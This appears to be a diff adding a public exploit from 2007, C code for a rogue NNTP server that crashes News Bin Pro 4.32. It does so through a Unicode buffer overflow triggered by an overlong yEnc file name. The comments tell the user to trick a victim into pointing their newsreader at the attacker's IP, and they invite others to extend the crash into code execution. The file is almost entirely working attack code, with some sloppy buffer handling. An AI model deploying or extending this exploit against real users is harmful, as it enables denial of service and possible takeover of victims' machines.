@@ -1,0 +1,132 @@
+/********************************************************************************
+*      News Bin Pro 4.32 Article Grabbing Remote Unicode Buffer Overflow        *
+*                                                                               *
+*                                                                               *
+* There is remote buffer overflow in News Bin Pro 4.32 that can be triggered by *
+* grabbing articles that contain an overly long file name.                      *
+*                                                                               *
+* To exploit, convince someone to set his newsgroup server to your ip:119 and   *
+* ask him to download an article and to bypass filters.                         *
+*                                                                               *
+* This is just a DoS. I couldnt make EIP point to some interesting place. This  *
+* is a unicode buffer overflow and we can force EIP to point on 0x00410041. But *
+* there's no good call esp in those places. However if we can set EIP to        *
+* 0x41004100 the problem is solved. Tell me if you go further.                  *
+* Have Fun!                                                                     *
+*                                                                               *
+* Tested against WIN XP SP2 FR                                                  *
+* Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>                    *
+********************************************************************************/
+
+
+
+#include "winsock2.h"
+#include "stdio.h"
+#include "time.h"
+#include "stdlib.h"
+#pragma comment(lib, "ws2_32.lib")
+
+
+int main(int argc, char* argv[])
+{
+	char recvbuff[1024];
+	char evilbuff[10000];
+	sockaddr_in sin;
+	int server,client;
+	WSADATA wsaData;
+	WSAStartup(MAKEWORD(1,1), &wsaData);
+
+	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	sin.sin_family = PF_INET;
+	sin.sin_addr.s_addr = htonl(INADDR_ANY);
+	sin.sin_port = htons( 119 );
+	bind(server,(SOCKADDR*)&sin,sizeof(sin));
+	printf("[+] News Bin Pro 4.32 ARTICLE cmd Remote Unicode Buffer Overflow\n");
+	printf("[+] Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
+	printf("[*] Listening on port 119...\n");
+	listen(server,5);
+	printf("[*] Waiting for client...\n");
+	printf("[+] Once connected, ask him to download and bypass filter a post\n");
+	
+	client=accept(server,NULL,NULL);
+	printf("[+] Client connected\n");
+	
+	if (send(client,"200 Hello there\r\n",17,0)==-1)
+	{
+		printf("[-] Error in send!\n");
+		exit(-1);
+	}
+
+	//MODE READER article or AUTHINFO user
+	memset(recvbuff,0,1024);
+	recv(client,recvbuff,1024,0);
+	printf("-> %s\n",recvbuff);
+	if (strstr(recvbuff,"AUTHINFO")) {
+		send(client,"381 Pass please?\r\n",18,0);
+
+		//authinfo pass
+		memset(recvbuff,0,1024);
+		recv(client,recvbuff,1024,0);
+		printf("-> %s\n",recvbuff);
+		send(client,"281 Pleased to meet you\r\n",25,0);
+	
+		//MODE READER
+		memset(recvbuff,0,1024);
+		recv(client,recvbuff,1024,0);
+		printf("-> %s\n",recvbuff);	
+	}
+
+	memcpy(evilbuff,"200 \r\n\0",7);
+	send(client,evilbuff,strlen(evilbuff),0);
+
+	//GROUP
+	memset(recvbuff,0,1024);
+	recv(client,recvbuff,1024,0);
+	printf("-> %s\n",recvbuff);
+	memcpy(evilbuff,"211 935430 87608194 88543623 alt.binaries.blabla\r\n\0",55);	
+	send(client,evilbuff,strlen(evilbuff),0);
+
+	memset(recvbuff,0,1024);
+	recv(client,recvbuff,1024,0);
+	printf("-> %s\n",recvbuff);	
+
+	char* postname=(char *) malloc(strlen(recvbuff)*sizeof(char));
+	memset(postname,0,100);
+	if (!strstr(recvbuff,"ARTICLE")) {
+		printf("[-] ARTICLE were expected. Exploit will fail.\n");
+	}
+	else {
+		memcpy(postname,recvbuff+8,strlen(recvbuff)-8);
+		printf("[+] Using %s to build evil data.\n",postname);
+	}
+	
+char header[]="220 0 ";
+
+char header2[]=" article\r\n"
+"Path: news.giganews.com.POSTED!not-for-mail\r\n"
+"NNTP-Posting-Date: Thu, 01 Mar 2007 11:25:26 -0600\r\n"
+"Lines: 5\r\n"
+"X-Postfilter: 1.3.34\r\n"
+"Xref:news.giganews.com alt.binaries.blabla:123456789\r\n\r\n\r\n"
+"=ybegin part=1 line=128 size=127 name="; //we put a large file name here to trigger the overflow
+
+char header3[]="\r\n"
+"=ypart begin=1 end=127\r\n"
+"blablabla\r\n"
+"=yend size=127 part=1 pcrc32=d4f19f0f\r\n"
+".\r\n";
+
+	memset(evilbuff,'A',10000);
+	memcpy(evilbuff,header,strlen(header));
+	memcpy(evilbuff+strlen(header),postname,strlen(postname));
+	memcpy(evilbuff+strlen(header)+strlen(postname),header2,strlen(header2));
+	memcpy(evilbuff+strlen(header)+strlen(postname)+strlen(header2)+2000,header3,strlen(header2));
+	send(client,evilbuff,strlen(evilbuff),0);
+	
+	printf("[+] Evil data sent. EIP should have become 0x00410041 \n    Tell me if you can go further =)\n");
+	Sleep(500);
+	return 0;
+	
+}
+
+// milw0rm.com [2007-03-12]
